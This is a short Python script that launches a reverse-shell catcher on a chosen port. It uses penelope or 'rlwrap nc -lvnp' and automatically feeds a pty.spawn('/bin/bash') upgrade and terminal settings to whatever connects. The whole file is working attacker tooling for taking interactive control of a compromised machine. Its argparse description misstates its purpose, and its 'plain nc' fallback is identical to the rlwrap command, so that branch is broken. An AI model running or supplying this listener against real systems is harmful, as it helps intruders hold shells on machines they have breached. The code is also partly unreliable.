#!/usr/bin/env python3
import subprocess
import argparse
import shutil

parser = argparse.ArgumentParser(description='Listen for executables and run them')
parser.add_argument('-p', '--port', type=int, default=9001, help='Port to listen on')
parser.add_argument('-f', '--force-old', action='store_true', help='Force old version of listener using nc instead of penelope')
# if -f is passed, force old version of listener using nc instead of penelope

args = parser.parse_args()

nc_command = '''stty raw -echo; (echo export TERM=xterm;echo 'python3 -c "import pty;pty.spawn(\"/bin/bash\")" || python3 -c "import pty;pty.spawn(\\"/bin/bash\\")"' ;echo "stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)"; echo reset;cat) | rlwrap \\nc -lvnp $port && reset'''

rlwrap_command = '''stty raw -echo; (echo export TERM=xterm;echo 'python3 -c "import pty;pty.spawn(\"/bin/bash\")" || python3 -c "import pty;pty.spawn(\\"/bin/bash\\")"' ;echo "stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)"; echo reset;cat) | rlwrap \\nc -lvnp $port && reset'''

penelope_command = '''penelope $port'''

# check if rlwrap exists and if so use it
rlwrap_exists = True if shutil.which('rlwrap') else False
penelope_exists = True if shutil.which('penelope') else False

# print(f"args.force_old: {args.force_old}")

if args.force_old or not penelope_exists:
    if rlwrap_exists:
        print('Using rlwrap')
        p = subprocess.Popen(rlwrap_command.replace('$port', str(args.port)), shell=True)
        p.wait()
    else:
        print('Using plain nc')
        p = subprocess.Popen(nc_command.replace('$port', str(args.port)), shell=True)
        p.wait()
else:
    print('Using penelope')
    p = subprocess.Popen(penelope_command.replace('$port', str(args.port)), shell=True)
    p.wait()
